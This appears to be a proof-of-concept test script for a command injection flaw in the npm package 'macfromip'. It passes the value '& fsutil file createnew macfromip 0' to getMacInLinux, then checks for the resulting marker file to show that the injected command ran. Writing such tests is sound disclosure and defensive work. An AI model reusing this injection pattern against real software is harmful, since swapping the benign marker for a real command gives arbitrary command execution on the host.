// test("Command Injection in macfromip", (done) => {
//   expect.assertions(2);
  const a = require("macfromip");
  const fs = require("fs");
  const path = "./macfromip";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  a.getMacInLinux("& fsutil file createnew macfromip 0", function () {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, function (err) {
//       done();
    });
  });
// });
